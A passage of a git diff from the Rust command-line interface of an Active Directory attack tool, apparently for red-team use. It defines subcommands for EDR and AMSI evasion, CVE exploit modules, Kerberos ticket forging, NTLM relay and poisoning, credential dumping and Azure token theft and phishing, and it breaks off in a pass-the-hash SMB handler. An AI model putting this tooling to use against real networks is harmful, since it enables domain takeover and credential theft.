@@ -521,6 +521,26 @@ enum Commands {
     },
 
     // ─── Shell completion generation ────────────────────────
+    /// Post-exploitation — check Credential Guard status on target
+    Cg {
+        /// Target hostname or IP
+        #[arg(short, long, required = true)]
+        target: String,
+    },
+
+    /// Post-exploitation — EDR assessment and evasion
+    Edr {
+        #[command(subcommand)]
+        action: EdrAction,
+    },
+
+    /// CVE exploit modules — sAMAccountName spoofing, Shadow Credentials, RBCD
+    #[command(alias = "cve")]
+    Exploit {
+        #[command(subcommand)]
+        action: ExploitAction,
+    },
+
     /// Generate shell tab-completion scripts
     #[command(name = "completions", alias = "completion", hide = true)]
     Completions {
@@ -555,447 +575,69 @@ enum ReportFormat {
     Json,
 }
 
+#[derive(Subcommand, Debug, Clone, Copy)]
+enum EdrAction {
+    /// Assess EDR landscape — detect hooked functions, EDR processes/drivers, ETW, AMSI
+    Assess,
+    /// Apply stealth profile (unhook NTDLL, abolish ETW, suppress AMSI)
+    Evade,
+}
+
+// ──────────────────────────────────────────────────────────
+// CVE Exploit sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum ExploitAction {
+    /// CVE-2021-42278/42287 — sAMAccountName spoofing + KDC confusion (domain admin)
+    SamNameSpoof {
+        /// DC sAMAccountName to spoof (e.g. DC01$)
+        #[arg(long)]
+        dc_sam: String,
+        /// Password for the temporary computer account
+        #[arg(long, default_value = "Exploit123!")]
+        password: String,
+    },
+    /// Shadow Credentials — write msDS-KeyCredentialLink + PKINIT auth
+    ShadowCred {
+        /// Target DN to attack (e.g. CN=TargetUser,CN=Users,DC=corp,DC=local)
+        #[arg(long)]
+        target_dn: String,
+    },
+    /// RBCD — Resource-Based Constrained Delegation
+    Rbcd {
+        /// Target service DN (e.g. CN=SERVER$,CN=Computers,DC=corp,DC=local)
+        #[arg(long)]
+        target_dn: String,
+        /// Attacker computer sAMAccountName (e.g. ATTACKER$)
+        #[arg(long)]
+        attacker: String,
+        /// Attacker computer password
+        #[arg(long, default_value = "Exploit123!")]
+        password: String,
+    },
+    /// Cleanup — remove artifacts from previous exploits
+    Cleanup {
+        /// Type of artifact to clean
+        #[arg(value_enum)]
+        artifact: CleanupTarget,
+        /// Target DN for cleanup (Shadow Credentials or RBCD)
+        #[arg(long)]
+        target_dn: Option<String>,
+        /// Computer DN for cleanup (sAMName spoof)
+        #[arg(long)]
+        computer_dn: Option<String>,
+    },
+}
+
 #[derive(Debug, Clone, Copy, clap::ValueEnum)]
-enum CompletionShell {
-    /// Bash shell
-    Bash,
-    /// Fish shell
-    Fish,
-    /// Zsh shell
-    Zsh,
-    /// PowerShell
-    PowerShell,
-    /// Elvish shell
-    Elvish,
-}
-
-// ──────────────────────────────────────────────────────────
-// Azure AD sub-commands
-// ──────────────────────────────────────────────────────────
-
-#[derive(Subcommand, Clone)]
-enum AzureAction {
-    /// Enumerate hybrid identity configuration (Azure AD Connect, SeamlessSSO, ADFS)
-    Enum,
-    /// Seamless SSO — Kerberos ticket → Azure AD token via AZUREADSSOACC$
-    SeamlessSso,
-    /// Golden SAML — forge SAML assertion with extracted ADFS cert
-    GoldenSaml {
-        /// Target UPN (user@domain) to impersonate
-        #[arg(long, default_value = "admin@corp.local")]
-        upn: String,
-    },
-    /// PRT theft — extract Primary Refresh Tokens from Windows TokenBroker cache
-    PrtTheft,
-}
-
-// ──────────────────────────────────────────────────────────
-// Forge sub-commands
-// ──────────────────────────────────────────────────────────
-
-#[derive(Subcommand)]
-enum ForgeAction {
-    /// Forge a Golden Ticket (TGT using krbtgt hash)
-    Golden {
-        /// Domain SID (e.g., S-1-5-21-...)
-        #[arg(long)]
-        domain_sid: String,
-        /// User to impersonate (default: Administrator)
-        #[arg(long, default_value = "Administrator")]
-        user: String,
-        /// User RID (default: 500 for Administrator)
-        #[arg(long, default_value = "500")]
-        rid: u32,
-        /// krbtgt NT hash (32 hex chars)
-        #[arg(long)]
-        krbtgt_hash: String,
-        /// Output file for the ticket
-        #[arg(
-            id = "forge_golden_output",
-            short = 'o',
-            long = "output",
-            value_name = "OUTPUT",
-            default_value = "golden.kirbi"
-        )]
-        output: String,
-    },
-    /// Forge a Silver Ticket (TGS using service account hash)
-    Silver {
-        /// Domain SID
-        #[arg(long)]
-        domain_sid: String,
-        /// User to impersonate
-        #[arg(long, default_value = "Administrator")]
-        user: String,
-        /// User RID
-        #[arg(long, default_value = "500")]
-        rid: u32,
-        /// Target SPN (e.g., cifs/dc01.corp.local)
-        #[arg(long)]
-        spn: String,
-        /// Service account NT hash
-        #[arg(long)]
-        service_hash: String,
-        /// Output file for the ticket
-        #[arg(
-            id = "forge_silver_output",
-            short = 'o',
-            long = "output",
-            value_name = "OUTPUT",
-            default_value = "silver.kirbi"
-        )]
-        output: String,
-    },
-}
-
-// ──────────────────────────────────────────────────────────
-// Enum targets
-// ──────────────────────────────────────────────────────────
-
-#[derive(Clone, clap::ValueEnum)]
-enum EnumTarget {
-    /// No-credential AD service triage plus anonymous LDAP RootDSE probe
-    Pre,
-    /// Anonymous LDAP RootDSE probe without username, password, or domain
-    Anonymous,
-    /// Null-session RID cycling through MS-SAMR where the target permits it
-    NullSession,
-    Users,
-    Computers,
-    Groups,
-    Trusts,
-    Spns,
-    Asrep,
-    Delegations,
-    Gpos,
-    Laps,
-    Policy,
-    All,
-}
-
-#[derive(Subcommand, Clone)]
-enum PowerViewAction {
-    /// Get-DomainUser equivalent
-    Users {
-        #[arg(long)]
-        identity: Option<String>,
-        #[arg(long)]
-        filter: Option<String>,
-        #[arg(long, default_value = "false")]
-        include_disabled: bool,
-    },
-    /// Get-DomainComputer equivalent
-    Computers {
-        #[arg(long)]
-        filter: Option<String>,
-        #[arg(long, default_value = "false")]
-        include_disabled: bool,
-    },
-    /// Get-DomainGroup equivalent
-    Groups {
-        #[arg(long, alias = "identity")]
-        group: Option<String>,
-        #[arg(long)]
-        filter: Option<String>,
-    },
-    /// Get-DomainTrust equivalent
-    Trusts,
-    /// Get-DomainSPNTicket / Get-DomainUser -SPN style discovery
-    Spns,
-    /// AS-REP roastable user discovery
-    Asrep,
-    /// Delegation discovery
-    Delegations,
-    /// Get-DomainGPO equivalent
-    Gpos {
-        #[arg(long, alias = "identity")]
-        name: Option<String>,
-    },
-    /// Domain policy and password policy discovery
-    Policy,
-    /// LAPS-readable computer discovery and read
-    Laps {
-        #[arg(long)]
-        computer: Option<String>,
-    },
-    /// Find-InterestingDomainAcl-style abusable ACE enumeration
-    Acls {
-        #[arg(long)]
-        sid: Option<String>,
-    },
-    /// Run the full LDAP-backed enumeration set
-    All,
-}
-
-#[derive(Subcommand, Clone)]
-enum GuidAction {
-    /// Resolve a GUID, right name, or attribute name
-    Resolve { value: String },
-    /// List the built-in GUID/right mappings
-    List {
-        #[arg(long)]
-        filter: Option<String>,
-    },
-}
-
-// ──────────────────────────────────────────────────────────
-// Kerberos sub-commands
-// ──────────────────────────────────────────────────────────
-
-#[derive(Subcommand, Clone)]
-enum KerberosAction {
-    Roast {
-        #[arg(long)]
-        spn: Option<String>,
-    },
-    AsrepRoast {
-        /// Optional file with usernames to roast (one per line)
-        #[arg(short = 'U', long)]
-        userlist: Option<String>,
-    },
-    /// Zero-knowledge username enumeration via Kerberos AS-REQ probes (no creds needed)
-    UserEnum {
-        /// Optional path to username wordlist (one per line). Omit to use the embedded candidate list.
-        #[arg(short = 'U', long)]
-        userlist: Option<String>,
-        /// Output file for discovered valid usernames
-        #[arg(
-            id = "kerberos_user_enum_output",
-            short = 'o',
-            long = "output",
-            value_name = "OUTPUT"
-        )]
-        output: Option<String>,
-        /// Delay between probes in milliseconds (evasion)
-        #[arg(long, default_value = "0")]
-        delay: u64,
-        /// Concurrent Kerberos probes to run at once
-        #[arg(long, default_value = "10")]
-        concurrency: usize,
-        /// When set, try to derive usernames from LDAP (anonymous/null-session)
-        #[arg(long)]
-        use_ldap: bool,
-    },
-    GetTgt,
-    GetTgs {
-        #[arg(long)]
-        spn: String,
-    },
-}
-
-// ──────────────────────────────────────────────────────────
-// SMB sub-commands
-// ──────────────────────────────────────────────────────────
-
-#[derive(Subcommand, Clone)]
-enum SmbAction {
-    Shares {
-        #[arg(short, long)]
-        target: String,
-    },
-    Admin {
-        #[arg(short, long)]
-        targets: String,
-    },
-    Spider {
-        #[arg(short, long)]
-        target: String,
-        #[arg(long, default_value = ".kdbx,.key,.pem,.config,.ps1,.rdp")]
-        extensions: String,
-    },
-    Get {
-        #[arg(short, long)]
-        target: String,
-        #[arg(short = 'P', long)]
-        path: String,
-    },
-    Put {
-        #[arg(short, long)]
-        target: String,
-        #[arg(short, long)]
-        local: String,
-        #[arg(short, long)]
-        remote: String,
-    },
-}
-
-// ──────────────────────────────────────────────────────────
-// Graph sub-commands
-// ──────────────────────────────────────────────────────────
-
-#[derive(Subcommand, Clone)]
-enum GraphAction {
-    Build,
-    /// Launch the local Rust BloodHound-style graph visualizer with ACE-aware detail panes.
-    #[command(alias = "visual", alias = "ui", alias = "viz")]
-    View {
-        /// BloodHound/Overthrone JSON files or directories. Defaults to --file or attack_graph.json.
-        #[arg(short = 'i', long = "input")]
-        input: Vec<String>,
-    },
-    /// Launch the browser-based graph GUI.
-    #[command(alias = "web", alias = "browser")]
-    Gui {
-        /// Overthrone/BloodHound JSON files or directories (directories are selectable per JSON).
-        #[arg(short = 'i', long = "input")]
-        input: Vec<String>,
-        /// Port to bind (0 selects a free port).
-        #[arg(long = "port", default_value = "0")]
-        port: u16,
-    },
-    /// Launch the local Rust BloodHound-style interactive tree explorer with ACE/DACL context.
-    #[command(alias = "hierarchy", alias = "explore")]
-    Tree {
-        /// BloodHound/Overthrone JSON files or directories. Defaults to --file or attack_graph.json.
-        #[arg(short = 'i', long = "input")]
-        input: Vec<String>,
-    },
-    Path {
-        #[arg(long)]
-        from: String,
-        #[arg(short, long)]
-        to: String,
-    },
-    PathToDa {
-        #[arg(long)]
-        from: String,
-    },
-    Stats,
-    Export {
-        #[arg(
-            id = "graph_export_output",
-            short = 'o',
-            long = "output",
-            value_name = "OUTPUT",
-            default_value = "graph.json"
-        )]
-        output: String,
-        /// Export in BloodHound-compatible format
-        #[arg(short = 'B', long)]
-        bloodhound: bool,
-    },
-}
-
-// ──────────────────────────────────────────────────────────
-// Dump sources
-// ──────────────────────────────────────────────────────────
-
-#[derive(Debug, Clone, clap::ValueEnum)]
-enum DumpSource {
-    Sam,
-    Lsa,
-    Ntds,
-    Dcc2,
-}
-
-// ──────────────────────────────────────────────────────────
-// Move sub-commands
-// ──────────────────────────────────────────────────────────
-
-#[derive(Subcommand)]
-enum MoveAction {
-    /// Display trust relationships from LDAP enumeration
-    Trusts,
-    /// Find cross-domain escalation paths
-    Escalation,
-    /// Analyze MSSQL linked servers for cross-domain chains
-    Mssql,
-    /// Print full trust map visualization
-    Map,
-}
-
-// ──────────────────────────────────────────────────────────
-// Secrets sub-commands
-// ──────────────────────────────────────────────────────────
-
-#[derive(Subcommand)]
-enum SecretsAction {
-    /// Dump SAM hive — extract local account NTLM hashes
-    Sam {
-        /// Path to SAM registry hive file
-        #[arg(long)]
-        sam: String,
-        /// Path to SYSTEM registry hive file
-        #[arg(long)]
-        system: String,
-    },
-    /// Dump LSA secrets — service account passwords, DPAPI keys
-    Lsa {
-        /// Path to SECURITY registry hive file
-        #[arg(long)]
-        security: String,
-        /// Path to SYSTEM registry hive file
-        #[arg(long)]
-        system: String,
-    },
-    /// Dump DCC2 cached domain credentials (mscash2)
-    Dcc2 {
-        /// Path to SECURITY registry hive file
-        #[arg(long)]
-        security: String,
-        /// Path to SYSTEM registry hive file
-        #[arg(long)]
-        system: String,
-    },
-}
-
-// ──────────────────────────────────────────────────────────
-// NTLM sub-commands
-// ──────────────────────────────────────────────────────────
-
-#[derive(Subcommand, Clone)]
-enum NtlmAction {
-    /// Capture NTLM hashes (Responder-style)
-    Capture {
-        /// Network interface to listen on
-        #[arg(short, long, default_value = "0.0.0.0")]
-        interface: String,
-        /// Port to listen on
-        #[arg(short = 'P', long, default_value = "445")]
-        port: u16,
-        /// Relay-only mode: skip poisoner/responder, use pre-captured hashes
-        #[arg(long)]
-        no_poison: bool,
-    },
-    /// Relay NTLM authentication to targets
-    Relay {
-        /// Target hosts (format: ip:port)
-        #[arg(short, long, required = true, value_delimiter = ',')]
-        targets: Vec<String>,
-        /// Listen port
-        #[arg(short = 'P', long, default_value = "445")]
-        port: u16,
-        /// Command to execute on successful relay
-        #[arg(short, long)]
-        command: Option<String>,
-        /// Relay-only mode: skip poisoner/responder, use pre-captured hashes
-        #[arg(long)]
-        no_poison: bool,
-    },
-    /// SMB-specific relay with signing bypass
-    SmbRelay {
-        /// Target SMB hosts
-        #[arg(short, long, required = true, value_delimiter = ',')]
-        targets: Vec<String>,
-        /// SMB port
-        #[arg(short = 'P', long, default_value = "445")]
-        port: u16,
-        /// Command to execute
-        #[arg(short, long)]
-        command: Option<String>,
-    },
-    /// HTTP/HTTPS relay
-    HttpRelay {
-        /// Target HTTP hosts
-        #[arg(short, long, required = true, value_delimiter = ',')]
-        targets: Vec<String>,
-        /// HTTP port
-        #[arg(short = 'P', long, default_value = "80")]
-        port: u16,
-        /// Command to execute via WinRM
-        #[arg(short, long)]
-        command: Option<String>,
-    },
+enum CleanupTarget {
+    /// Remove spoofed computer account
+    SamNameSpoof,
+    /// Remove msDS-KeyCredentialLink
+    ShadowCred,
+    /// Remove msDS-AllowedToActOnBehalfOfOtherIdentity
+    Rbcd,
 }
 
 // ──────────────────────────────────────────────────────────
@@ -1659,6 +1301,547 @@ enum GpoAction {
 }
 
 // ──────────────────────────────────────────────────────────
+// Enumeration targets
+// ──────────────────────────────────────────────────────────
+
+#[derive(Debug, Clone, Copy, clap::ValueEnum)]
+enum EnumTarget {
+    Pre,
+    Anonymous,
+    NullSession,
+    Users,
+    Computers,
+    Groups,
+    Trusts,
+    Spns,
+    Asrep,
+    Delegations,
+    Gpos,
+    Laps,
+    Policy,
+    All,
+}
+
+// ──────────────────────────────────────────────────────────
+// PowerView sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum PowerViewAction {
+    /// List domain users
+    Users {
+        #[arg(long)]
+        identity: Option<String>,
+        #[arg(long)]
+        filter: Option<String>,
+        #[arg(long, default_value = "false")]
+        include_disabled: bool,
+    },
+    /// List domain computers
+    Computers {
+        #[arg(long)]
+        filter: Option<String>,
+        #[arg(long, default_value = "false")]
+        include_disabled: bool,
+    },
+    /// List domain groups
+    Groups {
+        #[arg(long)]
+        group: Option<String>,
+        #[arg(long)]
+        filter: Option<String>,
+    },
+    /// Enumerate domain trusts
+    Trusts,
+    /// Enumerate Service Principal Names
+    Spns,
+    /// Enumerate AS-REP roastable accounts
+    Asrep,
+    /// Enumerate constrained/unconstrained delegations
+    Delegations,
+    /// List Group Policy Objects
+    Gpos {
+        #[arg(long)]
+        name: Option<String>,
+    },
+    /// Query default domain policy
+    Policy,
+    /// Read LAPS passwords
+    Laps {
+        #[arg(long)]
+        computer: Option<String>,
+    },
+    /// Enumerate object ACLs
+    Acls {
+        #[arg(long)]
+        sid: Option<String>,
+    },
+    /// Enumerate all objects
+    All,
+}
+
+// ──────────────────────────────────────────────────────────
+// GUID resolution sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum GuidAction {
+    /// Resolve a GUID to a human-readable name
+    Resolve {
+        /// GUID to resolve (e.g. 00000000-0000-0000-0000-000000000000)
+        value: String,
+    },
+    /// List all known GUIDs, optionally filtered
+    List {
+        /// Optional filter text
+        #[arg(long)]
+        filter: Option<String>,
+    },
+}
+
+// ──────────────────────────────────────────────────────────
+// Kerberos sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum KerberosAction {
+    /// Enumerate users via Kerberos (no credentials required)
+    UserEnum {
+        /// Path to username wordlist
+        #[arg(short = 'U', long)]
+        userlist: Option<String>,
+        /// Output file for valid usernames
+        #[arg(short, long)]
+        output: Option<String>,
+        /// Delay between attempts (seconds)
+        #[arg(long, default_value = "0")]
+        delay: u64,
+        /// Concurrency level
+        #[arg(long, default_value = "10")]
+        concurrency: usize,
+        /// Attempt LDAP username enumeration first
+        #[arg(long)]
+        use_ldap: bool,
+    },
+    /// Kerberoast — request TGS for SPNs
+    Roast {
+        /// Target SPN (roast all if omitted)
+        #[arg(long)]
+        spn: Option<String>,
+    },
+    /// AS-REP roast — request AS-REP for users without pre-authentication
+    AsrepRoast {
+        /// Path to user list
+        #[arg(short = 'U', long)]
+        userlist: Option<String>,
+    },
+    /// Request a TGS service ticket
+    GetTgs {
+        /// Service Principal Name
+        #[arg(short, long, required = true)]
+        spn: String,
+    },
+    /// Request a TGT (requires credentials or NT hash)
+    GetTgt,
+}
+
+// ──────────────────────────────────────────────────────────
+// SMB sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum SmbAction {
+    /// List SMB shares with read/write access
+    Shares {
+        /// Target hostname or IP
+        #[arg(short, long, required = true)]
+        target: String,
+    },
+    /// Check admin access on remote hosts
+    Admin {
+        /// Comma-separated target hosts
+        #[arg(short, long, required = true)]
+        targets: String,
+    },
+    /// Spider SMB shares for interesting files
+    Spider {
+        /// Target hostname or IP
+        #[arg(short, long, required = true)]
+        target: String,
+        /// File extensions to search for (comma-separated, e.g. .txt,.docx)
+        #[arg(
+            short,
+            long,
+            default_value = ".txt,.docx,.xlsx,.pdf,.csv,.cfg,.ps1,.xml,.ini,.kdbx,.rdp,.vmdk,.vhdx,.pst,.ost"
+        )]
+        extensions: String,
+    },
+    /// Download a file from an SMB share
+    Get {
+        /// Target hostname or IP
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Remote file path (UNC format or share-relative)
+        #[arg(short, long, required = true)]
+        path: String,
+    },
+    /// Upload a file to an SMB share
+    Put {
+        /// Target hostname or IP
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Local file path
+        #[arg(short, long, required = true)]
+        local: String,
+        /// Remote file path
+        #[arg(short, long, required = true)]
+        remote: String,
+    },
+}
+
+// ──────────────────────────────────────────────────────────
+// Dump source enum
+// ──────────────────────────────────────────────────────────
+
+#[derive(Debug, Clone, Copy, clap::ValueEnum)]
+enum DumpSource {
+    Sam,
+    Lsa,
+    Ntds,
+    Dcc2,
+}
+
+// ──────────────────────────────────────────────────────────
+// NTLM relay sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum NtlmAction {
+    /// LLMNR/NBT-NS/mDNS responder for credential capture
+    Capture {
+        /// Network interface to listen on
+        #[arg(short, long, default_value = "eth0")]
+        interface: String,
+        /// Listener port
+        #[arg(short, long, default_value = "0")]
+        port: u16,
+        /// Disable LLMNR/NBT-NS poisoning (capture only)
+        #[arg(long)]
+        no_poison: bool,
+        /// Enable mitm6 DHCPv6 poisoning
+        #[arg(long)]
+        mitm6: bool,
+    },
+    /// Generic NTLM relay to target
+    Relay {
+        /// Target hosts for relay
+        #[arg(short, long, required = true, value_delimiter = ',')]
+        targets: Vec<String>,
+        /// Listener port
+        #[arg(short, long, default_value = "0")]
+        port: u16,
+        /// Command to execute on targets (if SMB)
+        #[arg(short, long)]
+        command: Option<String>,
+        /// Disable LLMNR/NBT-NS poisoning
+        #[arg(long)]
+        no_poison: bool,
+        /// Enable mitm6 DHCPv6 poisoning
+        #[arg(long)]
+        mitm6: bool,
+        /// Attempt LDAP signing bypass
+        #[arg(long)]
+        ldap_signing_bypass: bool,
+    },
+    /// NTLM relay via SMB protocol
+    SmbRelay {
+        /// Target hosts for relay
+        #[arg(short, long, required = true, value_delimiter = ',')]
+        targets: Vec<String>,
+        /// Listener port
+        #[arg(short, long, default_value = "0")]
+        port: u16,
+        /// Command to execute on targets
+        #[arg(short, long)]
+        command: Option<String>,
+        /// Enable mitm6 DHCPv6 poisoning
+        #[arg(long)]
+        mitm6: bool,
+        /// Attempt LDAP signing bypass
+        #[arg(long)]
+        ldap_signing_bypass: bool,
+    },
+    /// NTLM relay via HTTP protocol
+    HttpRelay {
+        /// Target hosts for relay
+        #[arg(short, long, required = true, value_delimiter = ',')]
+        targets: Vec<String>,
+        /// Listener port
+        #[arg(short, long, default_value = "0")]
+        port: u16,
+        /// Command to execute on targets
+        #[arg(short, long)]
+        command: Option<String>,
+        /// Enable mitm6 DHCPv6 poisoning
+        #[arg(long)]
+        mitm6: bool,
+        /// Attempt LDAP signing bypass
+        #[arg(long)]
+        ldap_signing_bypass: bool,
+    },
+    /// NTLM relay via LDAP with GSS-SPNEGO bypass
+    LdapRelay {
+        /// Target host IP
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Listener port
+        #[arg(short, long, default_value = "389")]
+        port: u16,
+        /// Use LDAPS
+        #[arg(long)]
+        ldaps: bool,
+        /// Disable LDAP signing bypass
+        #[arg(long)]
+        no_signing_bypass: bool,
+    },
+    /// Standalone SMB daemon for credential capture
+    SmbDaemon {
+        /// Network interface to listen on
+        #[arg(short, long, default_value = "eth0")]
+        interface: String,
+        /// Listener port
+        #[arg(short, long, default_value = "445")]
+        port: u16,
+    },
+    /// NTLM relay via Exchange (EWS/MAPI)
+    Exchange {
+        /// Target Exchange server
+        #[arg(short, long, required = true)]
+        target: String,
+        /// Exchange listener port
+        #[arg(short, long, default_value = "443")]
+        port: u16,
+        /// Disable TLS
+        #[arg(long)]
+        no_tls: bool,
+        /// EWS path
+        #[arg(long, default_value = "/EWS/Exchange.asmx")]
+        ews_path: String,
+        /// MAPI path
+        #[arg(long, default_value = "/mapi/")]
+        mapi_path: String,
+        /// Prefer MAPI over EWS
+        #[arg(long)]
+        prefer_mapi: bool,
+        /// Exchange version
+        #[arg(long, default_value = "2019")]
+        version: String,
+    },
+}
+
+// ──────────────────────────────────────────────────────────
+// Forge sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum ForgeAction {
+    /// Forge a Golden Ticket (krbtgt)
+    Golden {
+        /// Domain SID
+        #[arg(long, required = true)]
+        domain_sid: String,
+        /// Username to impersonate
+        #[arg(short, long, default_value = "Administrator")]
+        user: String,
+        /// RID of the user (default: 500 = Administrator)
+        #[arg(long, default_value = "500")]
+        rid: u32,
+        /// krbtgt RC4 hash (32 hex chars)
+        #[arg(long, required = true)]
+        krbtgt_hash: String,
+        /// Output file for the forged ticket
+        #[arg(short, long, default_value = "golden.kirbi")]
+        output: String,
+    },
+    /// Forge a Silver Ticket (service)
+    Silver {
+        /// Domain SID
+        #[arg(long, required = true)]
+        domain_sid: String,
+        /// Username to impersonate
+        #[arg(short, long, default_value = "Administrator")]
+        user: String,
+        /// RID of the user (default: 500 = Administrator)
+        #[arg(long, default_value = "500")]
+        rid: u32,
+        /// Target SPN (e.g. cifs/dc01.corp.local)
+        #[arg(short, long, required = true)]
+        spn: String,
+        /// Service RC4 hash (32 hex chars)
+        #[arg(long, required = true)]
+        service_hash: String,
+        /// Output file for the forged ticket
+        #[arg(short, long, default_value = "silver.kirbi")]
+        output: String,
+    },
+}
+
+// ──────────────────────────────────────────────────────────
+// Lateral movement sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum MoveAction {
+    /// Enumerate domain trusts
+    Trusts,
+    /// Find cross-domain escalation paths
+    Escalation,
+    /// Analyze MSSQL linked server chains for lateral movement
+    Mssql,
+    /// Generate ASCII trust map
+    Map,
+}
+
+// ──────────────────────────────────────────────────────────
+// Offline secrets dumping sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum SecretsAction {
+    /// Dump SAM hive
+    Sam {
+        /// Path to SAM registry hive
+        #[arg(long, required = true)]
+        sam: String,
+        /// Path to SYSTEM registry hive
+        #[arg(long, required = true)]
+        system: String,
+    },
+    /// Dump LSA secrets
+    Lsa {
+        /// Path to SECURITY registry hive
+        #[arg(long, required = true)]
+        security: String,
+        /// Path to SYSTEM registry hive
+        #[arg(long, required = true)]
+        system: String,
+    },
+    /// Dump DCC2 cached domain credentials
+    Dcc2 {
+        /// Path to SECURITY registry hive
+        #[arg(long, required = true)]
+        security: String,
+        /// Path to SYSTEM registry hive
+        #[arg(long, required = true)]
+        system: String,
+    },
+}
+
+// ──────────────────────────────────────────────────────────
+// Azure AD / Entra ID attack sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum AzureAction {
+    /// Enumerate hybrid identity configuration
+    Enum,
+    /// Seamless SSO abuse — Silver Ticket for Azure AD Kerberos
+    SeamlessSso,
+    /// Golden SAML — forge arbitrary SAML tokens with ADFS signing cert
+    GoldenSaml {
+        /// ADFS signing certificate (base64-encoded PFX or PEM)
+        #[arg(long)]
+        signing_cert: Option<String>,
+        /// ADFS signing certificate private key (base64)
+        #[arg(long)]
+        signing_key: Option<String>,
+        /// IdP entity ID (defaults to <https://sts.windows.net/{tenant_id}/>)
+        #[arg(long)]
+        idp_entity_id: Option<String>,
+    },
+    /// PRT theft — extract Primary Refresh Token from a compromised session
+    PrtTheft,
+    /// Managed Identity token theft — extract token from Azure VM IMDS
+    ManagedIdentityToken,
+    /// Extract Entra Connect credentials
+    EntraConnectExtract,
+    /// Azure App Registration credential abuse
+    AppRegistrationAbuse,
+    /// Device Code phishing — trick users into approving MFA token requests
+    DeviceCodePhish,
+}
+
+// ──────────────────────────────────────────────────────────
+// Attack graph sub-commands
+// ──────────────────────────────────────────────────────────
+
+#[derive(Subcommand, Clone)]
+enum GraphAction {
+    /// Build attack graph from LDAP enumeration
+    Build,
+    /// View attack graph (BloodHound-style JSON viewer)
+    View {
+        /// Input graph JSON file(s)
+        #[arg(short, long, required = true)]
+        input: Vec<String>,
+    },
+    /// Launch web GUI for interactive graph exploration
+    Gui {
+        /// Input graph JSON file(s)
+        #[arg(short, long, required = true)]
+        input: Vec<String>,
+        /// Web server port
+        #[arg(short, long, default_value = "8080")]
+        port: u16,
+    },
+    /// Display tree view of the attack graph
+    Tree {
+        /// Input graph JSON file(s)
+        #[arg(short, long, required = true)]
+        input: Vec<String>,
+    },
+    /// Find shortest attack path between two nodes
+    Path {
+        /// Source node (sAMAccountName)
+        #[arg(short, long, required = true)]
+        from: String,
+        /// Target node (sAMAccountName)
+        #[arg(short, long, required = true)]
+        to: String,
+    },
+    /// Find all paths to Domain Admin
+    PathToDa {
+        /// Starting node (sAMAccountName)
+        #[arg(short, long, required = true)]
+        from: String,
+    },
+    /// Print graph statistics
+    Stats,
+    /// Export graph in various formats
+    Export {
+        /// Output file path
+        #[arg(short, long, required = true)]
+        output: String,
+        /// Export in BloodHound JSON format
+        #[arg(long)]
+        bloodhound: bool,
+    },
+}
+
+// ──────────────────────────────────────────────────────────
+// Shell completion targets
+// ──────────────────────────────────────────────────────────
+
+#[derive(Debug, Clone, Copy, clap::ValueEnum)]
+enum CompletionShell {
+    Bash,
+    Fish,
+    Zsh,
+    PowerShell,
+    Elvish,
+}
+
+// ──────────────────────────────────────────────────────────
 // Main
 // ──────────────────────────────────────────────────────────
 
@@ -1742,7 +1925,7 @@ async fn async_main() -> i32 {
             ref target,
             ref filter,
             include_disabled,
-        } => cmd_enum(&cli, target.clone(), filter.clone(), include_disabled).await,
+        } => cmd_enum(&cli, *target, filter.clone(), include_disabled).await,
         Commands::Powerview { ref action } => cmd_powerview(&cli, action.clone()).await,
         Commands::Guid { ref action } => cmd_guid(action.clone()),
         Commands::Kerberos { ref action } => cmd_kerberos(&cli, action.clone()).await,
@@ -1779,7 +1962,7 @@ async fn async_main() -> i32 {
         Commands::Dump {
             ref target,
             ref source,
-        } => commands_impl::cmd_dump(&cli, target, source.clone()).await,
+        } => commands_impl::cmd_dump(&cli, target, *source).await,
         Commands::Doctor {
             ref checks,
             ref target_dc,
@@ -1921,6 +2104,15 @@ async fn async_main() -> i32 {
 
         // ─── Azure AD attack handler ─────────────────────────
         Commands::Azure { ref action } => commands_impl::cmd_azure(&cli, action).await,
+
+        // ─── Credential Guard check handler ──────────────────
+        Commands::Cg { ref target } => cmd_cg(&cli, target).await,
+
+        // ─── EDR evasion handler ─────────────────────────────
+        Commands::Edr { ref action } => cmd_edr(&cli, *action).await,
+
+        // ─── CVE exploit handler ─────────────────────────────
+        Commands::Exploit { ref action } => cmd_exploit(&cli, action.clone()).await,
 
         // ─── Shell completion generation ─────────────────────
         Commands::Completions {
@@ -2301,6 +2493,435 @@ fn print_guid_entry(entry: GuidEntry) {
     println!("  Note:     {}", entry.note);
 }
 
+// ──────────────────────────────────────────────────────────
+// cmd_cg — Credential Guard Check
+// ──────────────────────────────────────────────────────────
+
+async fn cmd_cg(cli: &Cli, target: &str) -> i32 {
+    banner::print_module_banner("CREDENTIAL GUARD CHECK");
+
+    let domain = cli.domain.as_deref().unwrap_or("unknown");
+    println!("  {} Target: {}", "▸".bright_black(), target.cyan());
+    println!("  {} Domain: {}", "▸".bright_black(), domain.cyan());
+
+    use overthrone_core::postex::comprehensive_cg_check;
+
+    // Establish SMB session for remote registry CG detection
+    let mut smb_session = None;
+    if let Some(ref user) = cli.username {
+        if let Some(ref pass) = cli.password {
+            match overthrone_core::proto::smb::SmbSession::connect(target, domain, user, pass).await
+            {
+                Ok(s) => {
+                    println!("  {} SMB session established to {target}", "✓".green());
+                    smb_session = Some(s);
+                }
+                Err(e) => {
+                    println!("  {} SMB connect (optional): {e}", "▸".bright_black());
+                }
+            }
+        } else if let Some(ref hash) = cli.nt_hash {
+            match overthrone_core::proto::smb::SmbSession::connect_with_hash(
+                target, domain, user, hash,
+            )
+            .await
+            {
+                Ok(s) => {
+                    println!(
+                        "  {} SMB session established (PTH) to {target}",
+                        "✓".green()
+                    );
